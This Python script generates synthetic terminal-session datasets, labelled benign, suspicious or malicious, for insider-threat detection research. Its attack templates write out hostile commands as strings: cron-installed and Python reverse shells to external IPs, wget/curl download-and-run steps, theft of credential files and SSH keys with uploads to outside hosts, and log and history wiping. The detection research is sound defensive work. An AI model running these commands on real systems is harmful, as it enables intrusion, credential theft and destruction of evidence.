"""
Synthetic Terminal Session Dataset Generator  v4.0
===================================================
Produces realistic, non-memorisable command sequences for insider-threat /
anomaly-detection research.

Key design principles vs v3
────────────────────────────
  • False-positive injection (~8% of benign sessions get attack-looking but
    legitimate commands — security audits, privacy-conscious users, network
    ops). Label stays 0. Forces the model to learn context, not keywords.
  • Partial / interrupted attack chains (~30% of malicious sessions).
    Attackers get caught, abort, or pivot. Label stays 2 but evidence is
    incomplete — the model must detect threat from partial signal.
  • Cross-template pivot (~20% of malicious sessions blend steps from a
    second attack type, simulating an attacker changing tactics mid-session).
  • Everything from v3 retained: argument normalisation, factory-based
    command generation, behavioral templates, role bleed, typos.

Output schema
─────────────
  session_id          unique hex id
  user_id             stable user (80-person pool, role-assigned)
  role                dev | admin | analyst
  hostname            plausible workstation / server name
  session_start       ISO-8601 timestamp
  session_duration_s  integer seconds
  after_hours         0/1 flag
  command_count       number of commands in sequence
  command_sequence    " -> " joined command string
  label               0=benign  1=suspicious  2=malicious
  attack_type         none | recon | exfil | privilege_esc | lateral |
                      persistence | malware_drop | cover_tracks |
                      credential_harvest

Usage
─────
  python generate_sessions.py                          # 30 000 rows, defaults
  python generate_sessions.py --num 100000 --seed 7   # larger run
  python generate_sessions.py --out data/raw/v2.csv   # custom path
"""

import uuid
import re
import random
import argparse
import numpy as np
import pandas as pd
from pathlib import Path
from datetime import datetime, timedelta
from dataclasses import dataclass
from typing import Callable, List, Tuple


# ════════════════════════════════════════════════════════════
#  ARGUMENT NORMALISER
#  Applied to every command string before it is written to the
#  dataset.  Replaces high-cardinality argument values with
#  semantic placeholders so the tokenizer vocabulary stays
#  compact (~3 k tokens) and the model learns structure rather
#  than memorising specific IPs, hashes, or filenames.
# ════════════════════════════════════════════════════════════

# Ordered — more specific patterns first
_NORM_RULES: List[Tuple[re.Pattern, str]] = []   # populated below

def _build_norm_rules():
    global _NORM_RULES
    _NORM_RULES = [
        # IPv4 addresses (internal and external)
        (re.compile(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?:/\d{1,2})?\b'), '<IP>'),
        # /tmp hidden paths produced by _tmp()
        (re.compile(r'/tmp/\.[^\s\'"]+'),  '/tmp/<HIDDEN>'),
        # /tmp/<hex>.tar.gz archives
        (re.compile(r'/tmp/[0-9a-f]{6,}\.tar\.gz'), '/tmp/<ARCHIVE>'),
        # Any remaining /tmp/<something>
        (re.compile(r'/tmp/\S+'),          '/tmp/<TMPFILE>'),
        # Hex strings 6+ chars (git SHAs, uuids, docker ids, etc.)
        (re.compile(r'\b[0-9a-f]{6,}\b'), '<HEX>'),
        # Standalone integers that are ports / counts / line numbers
        (re.compile(r'\b\d{2,5}\b'),       '<NUM>'),
        # Timestamps like 202301010000
        (re.compile(r'\b20\d{10}\b'),      '<TIMESTAMP>'),
    ]

_build_norm_rules()   # initialise at import time


def normalise_command(cmd: str) -> str:
    """Replace high-cardinality argument tokens with semantic placeholders."""
    for pattern, replacement in _NORM_RULES:
        cmd = pattern.sub(replacement, cmd)
    return cmd


def normalise_sequence(seq: List[str]) -> List[str]:
    return [normalise_command(c) for c in seq]


# ════════════════════════════════════════════════════════════
#  PRIMITIVE SAMPLERS  (called at runtime — no fixed strings)
# ════════════════════════════════════════════════════════════

def _ip() -> str:
    return f"10.{random.randint(0,5)}.{random.randint(0,15)}.{random.randint(1,254)}"

def _ext_ip() -> str:
    """Simulate external / C2 IP addresses."""
    return random.choice([
        f"45.{random.randint(10,250)}.{random.randint(1,254)}.{random.randint(1,254)}",
        f"185.{random.randint(10,250)}.{random.randint(1,254)}.{random.randint(1,254)}",
        f"91.{random.randint(100,250)}.{random.randint(1,254)}.{random.randint(1,254)}",
    ])

def _host() -> str:
    return random.choice([
        "backup-01", "nas-store", "archive-srv", "dev-01",
        "staging-02", "data-lake", "log-collector", "build-agent",
    ])

def _remote_user() -> str:
    return random.choice(["root", "ubuntu", "admin", "deploy", "svc-acct"])

def _port() -> int:
    return random.choice([22, 80, 443, 3306, 5432, 6379, 8080, 9200, 4444, 1337])

def _project() -> str:
    return random.choice([
        "api-gateway", "ml-pipeline", "data-lake", "auth-service",
        "reporting", "etl-jobs", "recommendation-engine", "billing-svc",
    ])

def _logfile() -> str:
    return random.choice([
        "app.log", "error.log", "access.log", "audit.log",
        "nginx.log", "syslog", "auth.log", "debug.log",
    ])

def _datafile() -> str:
    return random.choice([
        "customers.csv", "transactions.csv", "model_weights.pkl",
        "embeddings.npy", "report.parquet", "users.db", "payroll.xlsx",
    ])

def _script() -> str:
    return random.choice([
        "train.py", "ingest.py", "evaluate.py", "deploy.sh",
        "migrate.py", "cleanup.py", "sync.py", "backup.sh",
    ])

def _service() -> str:
    return random.choice([
        "nginx", "postgresql", "redis", "celery",
        "gunicorn", "docker", "ssh", "cron", "auditd",
    ])

def _pkg() -> str:
    return random.choice([
        "pandas", "scikit-learn", "torch", "fastapi",
        "sqlalchemy", "boto3", "requests", "paramiko", "cryptography",
    ])

def _hex(n: int = 6) -> str:
    return uuid.uuid4().hex[:n]

def _tmp() -> str:
    """Hidden-ish temp path an attacker might use."""
    names = [f".{_hex()}", f".cache_{_hex(4)}", f"tmp_{_hex(4)}", f".sys_{_hex(4)}"]
    return f"/tmp/{random.choice(names)}"

def _archive() -> str:
    return f"/tmp/{_hex(8)}.tar.gz"

def _days_ago() -> int:
    return random.randint(1, 14)


# ════════════════════════════════════════════════════════════
#  COMMAND FACTORIES
#  Each entry is a zero-argument callable → str.
#  Calling at session-build time ensures every command has
#  fresh, varied arguments — the model cannot memorise them.
# ════════════════════════════════════════════════════════════

DEV_FACTORIES: List[Callable[[], str]] = [
    lambda: f"cd ~/projects/{_project()}",
    lambda: "git pull origin main",
    lambda: "git pull origin develop",
    lambda: "git status",
    lambda: f"git log --oneline -{random.randint(5, 20)}",
    lambda: f"git diff HEAD~{random.randint(1, 3)}",
    lambda: f"git checkout -b feature/{_hex(6)}",
    lambda: "git stash",
    lambda: f"python {_script()}",
    lambda: f"python -m pytest tests/ -{random.choice(['v', 'x', 'q'])}",
    lambda: f"pip install {_pkg()}",
    lambda: "pip install -r requirements.txt",
    lambda: "pip list --outdated",
    lambda: f"docker build -t myapp:{_hex(4)} .",
    lambda: f"docker run --rm -p {random.randint(8000, 9000)}:8080 myapp:latest",
    lambda: "docker ps",
    lambda: f"docker logs {_hex(6)} --tail {random.randint(20, 200)}",
    lambda: f"vim {_script()}",
    lambda: f"nano config/{random.choice(['settings', 'dev', 'prod'])}.yaml",
    lambda: f"cat config/{random.choice(['settings', 'dev', 'prod'])}.yaml",
    lambda: "grep -r 'TODO' src/",
    lambda: "find . -name '*.py' | xargs wc -l",
    lambda: "ls -la",
    lambda: f"env | grep {random.choice(['DATABASE', 'REDIS', 'API', 'SECRET'])}",
    lambda: f"export {random.choice(['DEBUG','LOG_LEVEL','ENV'])}={random.choice(['true','false','info','production'])}",
    lambda: f"curl -s http://localhost:{random.randint(8000, 9000)}/health",
    lambda: f"ssh -i ~/.ssh/id_rsa deploy@{_host()}",
    lambda: "make test",
    lambda: "make build",
    lambda: f"tail -f logs/{_logfile()}",
    lambda: f"cat logs/{_logfile()}",
    lambda: "pytest tests/unit/ --cov=src --cov-report=term-missing",
    lambda: "black src/",
    lambda: "flake8 src/ --max-line-length 100",
]

ADMIN_FACTORIES: List[Callable[[], str]] = [
    lambda: f"sudo systemctl status {_service()}",
    lambda: f"sudo systemctl restart {_service()}",
    lambda: f"sudo systemctl enable {_service()}",
    lambda: "sudo apt update",
    lambda: f"sudo apt install -y {random.choice(['libssl-dev','curl','htop','net-tools','auditd'])}",
    lambda: "sudo apt autoremove -y",
    lambda: f"journalctl -u {_service()} -n {random.randint(50, 500)}",
    lambda: f"journalctl -xe --since '{random.randint(1, 24)} hour ago'",
    lambda: "df -h",
    lambda: "du -sh /var/log/*",
    lambda: "free -m",
    lambda: f"top -bn1 | head -{random.randint(15, 30)}",
    lambda: "vmstat 1 5",
    lambda: "iostat -x 1 3",
    lambda: "netstat -tulpn",
    lambda: "ss -tlnp",
    lambda: f"sudo ufw allow {_port()}/tcp",
    lambda: "sudo ufw status verbose",
    lambda: f"cat /var/log/{_logfile()}",
    lambda: "tail -f /var/log/syslog",
    lambda: f"grep -i 'error\\|warn' /var/log/syslog | tail -{random.randint(20, 100)}",
    lambda: f"sudo chmod {random.choice(['644','640','600'])} /etc/nginx/nginx.conf",
    lambda: "sudo chown www-data /var/www/html",
    lambda: "crontab -l",
    lambda: "sudo -l",
    lambda: "uptime",
    lambda: "who",
    lambda: f"last | head -{random.randint(10, 30)}",
    lambda: f"sudo nano /etc/{random.choice(['hosts','resolv.conf','fstab'])}",
    lambda: f"ping -c {random.randint(3, 10)} {_ip()}",
    lambda: "sudo iptables -L -n",
    lambda: f"sudo journalctl --since '{random.randint(1,7)} days ago' | grep -i fail",
]

# Helper functions to avoid f-string quoting conflicts in analyst commands
_SQLITE_TABLES = ["events", "sessions", "users", "logs", "audit"]
_PSQL_TABLES   = ["summary", "daily_stats", "users", "events"]

def _sqlite_cmd() -> str:
    t = random.choice(_SQLITE_TABLES)
    return "sqlite3 analytics.db 'SELECT COUNT(*) FROM " + t + ";'"

def _psql_cmd() -> str:
    t = random.choice(_PSQL_TABLES)
    n = random.randint(5, 50)
    return "psql -U analyst -c 'SELECT * FROM " + t + " LIMIT " + str(n) + ";'"

def _pandas_cmd() -> str:
    f = _datafile()
    return "python -c 'import pandas as pd; df=pd.read_csv(\"/data/" + f + "\"); print(df.describe())'"


ANALYST_FACTORIES: List[Callable[[], str]] = [
    lambda: f"cat /data/{_datafile()}",
    lambda: f"head -{random.randint(10, 50)} /data/{_datafile()}",
    lambda: f"wc -l /data/{_datafile()}",
    lambda: f"less /var/log/{_logfile()}",
    lambda: f"grep -i '{random.choice(['error','warn','fail','timeout'])}' /var/log/{_logfile()}",
    lambda: f"grep -E '[0-9]{{4}}-[0-9]{{2}}-[0-9]{{2}}' /var/log/{_logfile()} | wc -l",
    lambda: f"awk '{{print $1}}' /var/log/{_logfile()} | sort | uniq -c | sort -rn | head -10",
    lambda: f"cut -d',' -f{random.randint(1,5)},{random.randint(6,10)} /data/{_datafile()} | head",
    lambda: f"sort -t',' -k{random.randint(1,5)} -n /data/{_datafile()} | tail -{random.randint(10,30)}",
    lambda: f"python analyze.py --input /data/{_datafile()}",
    lambda: f"python analyze.py --input /data/{_datafile()} --output /tmp/results_{_hex(4)}.csv",
    lambda: f"jupyter nbconvert --to script analysis_{_hex(4)}.ipynb",
    lambda: f"tar -czf {_archive()} /var/log/ 2>/dev/null",
    lambda: f"scp /tmp/results_{_hex(4)}.csv {_host()}:/backup/",
    lambda: f"rsync -avz /data/ {_host()}:/backup/data/",
    lambda: "ls -lh /data",
    lambda: "du -sh /data/*",
    lambda: f"md5sum /data/{_datafile()}",
    lambda: _sqlite_cmd(),
    lambda: _psql_cmd(),
    lambda: _pandas_cmd(),
    lambda: f"diff /data/{_datafile()} /backup/{_datafile()}",
]

COMMON_FACTORIES: List[Callable[[], str]] = [
    lambda: "ls",
    lambda: "ls -la",
    lambda: "ls -lh",
    lambda: "cd ~",
    lambda: "cd ..",
    lambda: "pwd",
    lambda: "echo $PATH",
    lambda: "echo $USER",
    lambda: f"history | tail -{random.randint(10, 30)}",
    lambda: "clear",
    lambda: "whoami",
    lambda: "date",
    lambda: "uptime",
    lambda: "which python",
    lambda: "which git",
    lambda: f"man {random.choice(['ls','grep','awk','sed','find'])}",
    lambda: "source ~/.bashrc",
    lambda: "alias ll='ls -la'",
]

TYPO_POOL: List[str] = [
    "gti status", "sl", "pythno script.py", "sudp apt update",
    "gep -r pattern .", "cta README.md", "pyhton -m pytest",
    "dockr ps", "giit pull", "mkae build",
]

# ── Suspicious: intentionally overlaps with legitimate admin / dev work
SUSPICIOUS_FACTORIES: List[Callable[[], str]] = [
    lambda: "id",
    lambda: "groups",
    lambda: "sudo -l",
    lambda: "getent passwd",
    lambda: "cat /etc/group",
    lambda: f"ping -c {random.randint(3,10)} {_ip()}",
    lambda: f"traceroute {_ip()}",
    lambda: "netstat -an | grep ESTABLISHED",
    lambda: "ss -antp",
    lambda: "arp -a",
    lambda: "ip route show",
    lambda: "ip neigh show",
    lambda: f"env | grep -i {random.choice(['pass','secret','key','token','auth'])}",
    lambda: "cat ~/.bash_history",
    lambda: "cat ~/.ssh/known_hosts",
    lambda: "cat ~/.gitconfig",
    lambda: "ls -la ~/.ssh/",
    lambda: "ls -la ~/.aws/",
    lambda: "find / -perm -4000 2>/dev/null",
    lambda: f"find /home -name '*.{random.choice(['key','pem','p12','pfx'])}' 2>/dev/null",
    lambda: "ls -la /etc/cron*",
    lambda: "ls -la /var/spool/cron/",
    lambda: f"cp /etc/passwd /tmp/p_{_hex(4)}.txt",
    lambda: f"zip -r {_archive()} /data/",
    lambda: f"tar -czf {_archive()} ~/",
    lambda: f"echo {_hex(24)} | base64 -d",
    lambda: f"python3 -c \"import base64; print(base64.b64decode('{_hex(24)}'))\"",
    lambda: "crontab -e",
    lambda: f"cat /etc/cron.d/{random.choice(['backup','logrotate','monitoring'])}",
]


# ════════════════════════════════════════════════════════════
#  ATTACK BEHAVIORAL TEMPLATES
#  Steps are zero-arg callables so each instantiation
#  produces fresh IPs, paths, filenames, and hashes.
# ════════════════════════════════════════════════════════════

@dataclass
class AttackTemplate:
    name:         str
    steps:        List[Callable[[], str]]
    blend_before: Tuple[int, int] = (2, 6)
    blend_after:  Tuple[int, int] = (0, 3)


ATTACK_TEMPLATES: List[AttackTemplate] = [

    AttackTemplate("recon", [
        lambda: "whoami",
        lambda: "id",
        lambda: f"uname -{random.choice(['a','r','m'])}",
        lambda: "cat /etc/os-release",
        lambda: "ip a",
        lambda: "ip route",
        lambda: f"nmap -sV -p {random.randint(20,100)}-{random.randint(200,1024)} {_ip()}/{random.choice([24,16])}",
        lambda: "cat /etc/hosts",
        lambda: "arp -a",
        lambda: f"nmap -p- {_ip()} -T{random.randint(2,4)}",
        lambda: f"ps aux --sort=-%cpu | head -{random.randint(15,30)}",
        lambda: "cat /proc/version",
        lambda: f"find / -writable -type d 2>/dev/null | head -{random.randint(10,25)}",
        lambda: "ls -la /opt/",
        lambda: "cat /etc/crontab",
    ]),

    AttackTemplate("privilege_esc", [
        lambda: "sudo -l",
        lambda: f"sudo -u {random.choice(['root','www-data','postgres'])} {random.choice(['id','whoami','bash'])}",
        lambda: "cat /etc/passwd | grep -v nologin",
        lambda: "cat /etc/shadow",
        lambda: f"cp /etc/shadow {_tmp()}.bak",
        lambda: f"scp {_tmp()}.bak {_remote_user()}@{_host()}:/tmp/dump_{_hex(4)}.txt",
        lambda: f"rm -f {_tmp()}.bak",
        lambda: "history -c",
        lambda: "cat /dev/null > ~/.bash_history",
    ]),

    AttackTemplate("credential_harvest", [
        lambda: f"cat ~/.ssh/id_{random.choice(['rsa','ed25519','ecdsa'])}",
        lambda: "find / -name 'id_rsa' 2>/dev/null | head -5",
        lambda: "find / -name '*.pem' 2>/dev/null | head -5",
        lambda: "cat ~/.aws/credentials",
        lambda: "cat ~/.aws/config",
        lambda: f"env | grep -iE '{random.choice(['pass','token','secret','api_key'])}'",
        lambda: f"cat {random.choice(['/etc/passwd','/etc/group'])}",
        lambda: f"tar -czf {_archive()} ~/.ssh/ ~/.aws/ 2>/dev/null",
        lambda: f"scp {_archive()} {_remote_user()}@{_ext_ip()}:{_tmp()}/",
        lambda: f"rm -f {_archive()}",
        lambda: "history -c",
    ]),

    AttackTemplate("exfil", [
        lambda: f"find /data -name '*.{random.choice(['csv','parquet','db','xlsx'])}' -mtime -{_days_ago()}",
        lambda: f"find /var/log -name '*.log' -size +{random.randint(1,50)}M",
        lambda: f"tar -czf {_archive()} /data/ 2>/dev/null",
        lambda: f"split -b {random.randint(50,200)}M {_archive()} {_tmp()}_part_",
        lambda: f"scp {_tmp()}_part_* {_remote_user()}@{_ext_ip()}:/uploads/",
        lambda: f"curl -s -F 'file=@{_archive()}' http://{_ext_ip()}:{_port()}/upload",
        lambda: f"rm -f {_archive()} {_tmp()}_part_*",
        lambda: "history -c",
    ]),

    AttackTemplate("lateral", [
        lambda: f"nmap -sS -p {random.choice([22,3389,5985])} {_ip()}/{random.choice([24,16])} --open -oN {_tmp()}.txt",
        lambda: f"ssh -o StrictHostKeyChecking=no {_remote_user()}@{_ip()}",
        lambda: f"ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_rsa {_remote_user()}@{_ip()} 'id; hostname'",
        lambda: f"sshpass -p '{_hex(10)}' ssh {_remote_user()}@{_ip()} 'cat /etc/passwd'",
        lambda: f"scp {_remote_user()}@{_ip()}:/etc/passwd {_tmp()}.txt",
        lambda: f"rm -f {_tmp()}.txt",
    ]),

    AttackTemplate("persistence", [
        lambda: f"echo '*/{random.randint(5,30)} * * * * bash -i >& /dev/tcp/{_ext_ip()}/{_port()} 0>&1' | crontab -",
        lambda: "crontab -l",
        lambda: f"echo '[Unit]' > {_tmp()}.service",
        lambda: f"sudo cp {_tmp()}.service /etc/systemd/system/sys-{_hex(4)}.service",
        lambda: "sudo systemctl daemon-reload",
        lambda: f"sudo systemctl enable sys-{_hex(4)}",
        lambda: f"curl -s http://{_ext_ip()}/ping",
    ]),

    AttackTemplate("malware_drop", [
        lambda: f"wget -q http://{_ext_ip()}/{_hex(8)}.sh -O {_tmp()}.sh",
        lambda: f"curl -s http://{_ext_ip()}/{_hex(8)}.bin -o {_tmp()}.bin",
        lambda: f"chmod +x {_tmp()}.sh",
        lambda: f"{_tmp()}.sh &",
        lambda: f"nohup python3 -c \"import socket,os,pty;s=socket.socket();s.connect(('{_ext_ip()}',{_port()}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/sh')\" &",
        lambda: f"rm -f {_tmp()}.sh {_tmp()}.bin",
        lambda: f"echo '*/{random.randint(5,60)} * * * * {_tmp()}.py' | crontab -",
    ]),

    AttackTemplate("cover_tracks", [
        lambda: "history -c",
        lambda: "cat /dev/null > ~/.bash_history",
        lambda: f"sudo truncate -s 0 /var/log/{random.choice(['auth.log','syslog','wtmp','btmp'])}",
        lambda: f"sudo find /var/log -name '*.log' -mmin -{random.randint(10,60)} -exec truncate -s 0 {{}} \\;",
        lambda: f"sudo rm -f /var/log/{random.choice(['wtmp','btmp','lastlog'])}",
        lambda: f"touch -t {random.randint(2000,2023)}{random.randint(1,12):02d}{random.randint(1,28):02d}0000 ~/.bash_history",
        lambda: "unset HISTFILE",
        lambda: "export HISTSIZE=0",
    ]),
]


# ════════════════════════════════════════════════════════════
#  USER & HOST POOLS
# ════════════════════════════════════════════════════════════

def _build_user_pool(n: int = 80) -> dict:
    ids   = [f"u{i:04d}" for i in range(n)]
    roles = ["dev"] * 40 + ["admin"] * 20 + ["analyst"] * 20
    random.shuffle(roles)
    return dict(zip(ids, roles))

def _build_hostnames() -> List[str]:
    return (
        [f"dev-ws-{i:02d}"       for i in range(1, 16)]
        + [f"admin-srv-{i:02d}"  for i in range(1, 9)]
        + [f"analyst-ws-{i:02d}" for i in range(1, 13)]
    )


# ════════════════════════════════════════════════════════════
#  TEMPORAL HELPERS
# ════════════════════════════════════════════════════════════

_WORK_HOURS = list(range(8, 19))
_OFF_HOURS  = list(range(0, 8)) + list(range(19, 24))
_BASE_DATE  = datetime(2025, 6, 1)

def _session_start(after_hours_prob: float = 0.08) -> datetime:
    day  = _BASE_DATE + timedelta(days=random.randint(0, 179))
    hour = random.choice(_OFF_HOURS if random.random() < after_hours_prob else _WORK_HOURS)
    return day.replace(hour=hour, minute=random.randint(0, 59), second=random.randint(0, 59))

def _is_after_hours(ts: datetime) -> bool:
    return ts.hour not in _WORK_HOURS


# ════════════════════════════════════════════════════════════
#  FALSE-POSITIVE LOOKALIKES
#  Commands that look suspicious but are completely legitimate
#  in context (security audits, routine ops, privacy habits).
#  Injected into label-0 sessions to stop the model treating
#  any single command as a definitive threat signal.
# ════════════════════════════════════════════════════════════

FALSE_POSITIVE_FACTORIES: List[Callable[[], str]] = [
    # Security team running audits
    lambda: "cat /etc/shadow",                              # password auditor
    lambda: "find / -perm -4000 2>/dev/null",              # suid audit
    lambda: f"nmap -sV {_ip()}",                           # network inventory
    lambda: f"nmap -p <NUM>-<NUM> {_ip()}/<NUM>",          # subnet scan (ops)
    lambda: "cat /etc/passwd | grep -v nologin",           # account review
    # Privacy-conscious or policy-following users
    lambda: "history -c",                                  # clear history (policy)
    lambda: "unset HISTFILE",                              # disable history logging
    lambda: "cat /dev/null > ~/.bash_history",             # wipe history (policy)
    # Routine legitimate file transfers
    lambda: f"scp logs.tar.gz {_host()}:/backup/",         # routine backup
    lambda: f"scp /var/log/{_logfile()} {_host()}:/archive/",
    lambda: f"rsync -avz /data/ {_host()}:/backup/data/",
    # Routine credential / key management
    lambda: "cat ~/.ssh/known_hosts",                      # key review
    lambda: "ls -la ~/.ssh/",                              # ssh dir check
    lambda: "cat ~/.aws/credentials",                      # aws ops check
    lambda: f"ssh-keygen -t ed25519 -f ~/.ssh/id_{_hex(4)}",
    # Legitimate cron management
    lambda: "crontab -e",                                  # scheduling jobs
    lambda: f"cat /etc/cron.d/{random.choice(['backup','logrotate','monitoring'])}",
    # Routine recon / inventory (ops teams do this daily)
    lambda: "ip a",
    lambda: "arp -a",
    lambda: "netstat -tulpn",
    lambda: f"ping -c {random.randint(3,5)} {_ip()}",
    # Legitimate env inspection
    lambda: f"env | grep -i {random.choice(['path','home','user','lang'])}",
    lambda: "sudo -l",                                     # checking own permissions
    lambda: "id",
]


# ════════════════════════════════════════════════════════════
#  ATTACK CHAIN VARIANTS
# ════════════════════════════════════════════════════════════

def _full_chain(template: AttackTemplate) -> List[str]:
    """Instantiate every step of a template with fresh arguments."""
    return [step() for step in template.steps]


def _partial_chain(template: AttackTemplate) -> List[str]:
    """
    Return only a random prefix of the chain.
    Simulates an attacker who was interrupted, panicked, or aborted.
    Always keeps at least 1 step, always drops at least 1 step.
    """
    steps  = template.steps
    cutoff = random.randint(1, max(1, len(steps) - 1))
    return [step() for step in steps[:cutoff]]


def _pivot_chain(primary: AttackTemplate, all_templates: List[AttackTemplate]) -> List[str]:
    """
    Blend the full primary chain with a few steps from a second template.
    Simulates an attacker who pivots tactics mid-session.
    """
    secondary = random.choice([t for t in all_templates if t.name != primary.name])
    pivot_steps = random.sample(secondary.steps, random.randint(1, 3))
    pivot_cmds  = [step() for step in pivot_steps]
    full        = _full_chain(primary)
    # Insert pivot steps at a random position inside the primary chain
    insert_at = random.randint(1, max(1, len(full) - 1))
    for i, cmd in enumerate(pivot_cmds):
        full.insert(insert_at + i, cmd)
    return full


# ════════════════════════════════════════════════════════════
#  SESSION BUILDER
# ════════════════════════════════════════════════════════════

def _role_factories(role: str) -> List[Callable[[], str]]:
    return {"dev": DEV_FACTORIES, "admin": ADMIN_FACTORIES, "analyst": ANALYST_FACTORIES}[role]

def _sample(factories: List[Callable[[], str]], k: int) -> List[str]:
    """Sample k factories and call each fresh — produces varied arguments."""
    return [f() for f in random.choices(factories, k=k)]


def generate_session(user_id: str, role: str, hostname: str) -> dict:
    ts       = _session_start()
    duration = random.randint(30, 3600)
    label    = 0
    attack   = "none"

    role_pool = _role_factories(role) + COMMON_FACTORIES

    # ── Baseline normal activity
    seq = _sample(role_pool, random.randint(6, 28))

    # ── Role bleed (realistic cross-role tool use)
    if random.random() < 0.12:
        other = random.choice([r for r in ["dev", "admin", "analyst"] if r != role])
        bleed = _sample(_role_factories(other), random.randint(1, 3))
        pos   = random.randint(0, len(seq))
        for i, cmd in enumerate(bleed):
            seq.insert(pos + i, cmd)

    # ── Fat-finger typos
    if random.random() < 0.12:
        seq.insert(random.randint(0, len(seq)), random.choice(TYPO_POOL))

    # ── !! re-run (common human habit)
    if random.random() < 0.07:
        seq.insert(random.randint(1, len(seq)), "!!")

    # ── FALSE-POSITIVE injection (~8% of benign sessions)
    #    Legitimate commands that resemble attack behaviour.
    #    Applied before suspicious/malicious layers so it only
    #    affects sessions that stay label 0.
    inject_fp = (label == 0) and (random.random() < 0.08)
    if inject_fp:
        fp_cmds = random.sample(FALSE_POSITIVE_FACTORIES, random.randint(1, 3))
        for f in fp_cmds:
            seq.insert(random.randint(0, len(seq)), f())
        # label intentionally stays 0 — these are legitimate

    # ── Suspicious layer  (~35% of sessions, 2–5 commands each)
    if random.random() < 0.35:
        for f in random.sample(SUSPICIOUS_FACTORIES, random.randint(2, 5)):
            seq.insert(random.randint(0, len(seq)), f())
        label = 1

    # ── Malicious chain  (2× likely after hours)
    mal_prob = 0.18 if _is_after_hours(ts) else 0.08
    if random.random() < mal_prob:
        template = random.choice(ATTACK_TEMPLATES)
        attack   = template.name

        # Choose chain variant:
        #   30% → partial (interrupted / aborted attacker)
        #   20% → pivot   (attacker switches tactics mid-session)
        #   50% → full    (complete attack chain)
        r = random.random()
        if r < 0.30:
            chain = _partial_chain(template)
            attack = f"{attack}__partial"
        elif r < 0.50:
            chain = _pivot_chain(template, ATTACK_TEMPLATES)
            attack = f"{attack}__pivot"
        else:
            chain = _full_chain(template)

        pre  = _sample(role_pool, random.randint(*template.blend_before))
        post = _sample(role_pool, random.randint(*template.blend_after))
        pos  = random.randint(len(pre), len(pre) + len(seq))
        seq  = pre + seq
        for i, cmd in enumerate(chain):
            seq.insert(pos + i, cmd)
        seq.extend(post)
        label = 2

    seq.append("exit")

    # ── Normalise arguments — collapses vocab from ~38k to ~3k tokens
    seq = normalise_sequence(seq)

    return {
        "session_id":         uuid.uuid4().hex,
        "user_id":            user_id,
        "role":               role,
        "hostname":           hostname,
        "session_start":      ts.isoformat(timespec="seconds"),
        "session_duration_s": duration,
        "after_hours":        int(_is_after_hours(ts)),
        "command_count":      len(seq),
        "command_sequence":   " -> ".join(seq),
        "label":              label,
        "attack_type":        attack,
    }


# ════════════════════════════════════════════════════════════
#  DATASET BUILDER
# ════════════════════════════════════════════════════════════

def generate_dataset(n: int, output: str, seed: int = 42) -> None:
    random.seed(seed)
    np.random.seed(seed)

    users     = list(_build_user_pool(80).items())
    hostnames = _build_hostnames()

    rows = [
        generate_session(*random.choice(users), random.choice(hostnames))
        for _ in range(n)
    ]

    df = pd.DataFrame(rows)
    df["session_start"] = pd.to_datetime(df["session_start"])
    df = df.sort_values("session_start").reset_index(drop=True)
    df["session_start"] = df["session_start"].astype(str)

    out          = Path(output)
    csv_path     = out.with_suffix(".csv")
    parquet_path = out.with_suffix(".parquet")
    out.parent.mkdir(parents=True, exist_ok=True)

    df.to_csv(csv_path, index=False)
    df.to_parquet(parquet_path, index=False, engine="pyarrow", compression="snappy")

    # ── Pretty summary
    label_map = {0: "benign", 1: "suspicious", 2: "malicious"}
    seq_lens  = df["command_sequence"].str.split(" -> ").str.len()

    print(f"\n{'═'*56}")
    print(f"  Synthetic Session Generator  v4.0")
    print(f"{'═'*56}")
    print(f"  Sessions   : {n:,}")
    print(f"  CSV        : {csv_path}")
    print(f"  Parquet    : {parquet_path}")
    print(f"\n  Label distribution")
    print(f"  {'─'*40}")
    for lbl, cnt in df["label"].value_counts().sort_index().items():
        bar = "█" * int(cnt / n * 40)
        print(f"  {lbl}  {label_map[lbl]:<12} {cnt:>6,}  ({cnt/n*100:4.1f}%)  {bar}")

    print(f"\n  Attack types")
    print(f"  {'─'*40}")
    for atype, cnt in df[df["label"] == 2]["attack_type"].value_counts().items():
        print(f"  {atype:<24} {cnt:>5,}")

    print(f"\n  After-hours : {df['after_hours'].sum():,}  ({df['after_hours'].mean()*100:.1f}%)")
    print(f"  Seq length  : avg {seq_lens.mean():.1f}  "
          f"max {seq_lens.max()}  p95 {seq_lens.quantile(0.95):.0f}")
    print(f"{'═'*56}\n")


# ════════════════════════════════════════════════════════════
#  CLI
# ════════════════════════════════════════════════════════════

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Synthetic terminal session generator — v4.0",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--num",  type=int, default=30_000,
                        help="Number of sessions to generate")
    parser.add_argument("--out",  type=str, default="data/raw/synthetic_commands.csv",
                        help="Output path (.csv and .parquet saved automatically)")
    parser.add_argument("--seed", type=int, default=42,
                        help="Random seed for reproducibility")
    args = parser.parse_args()

    generate_dataset(args.num, args.out, seed=args.seed)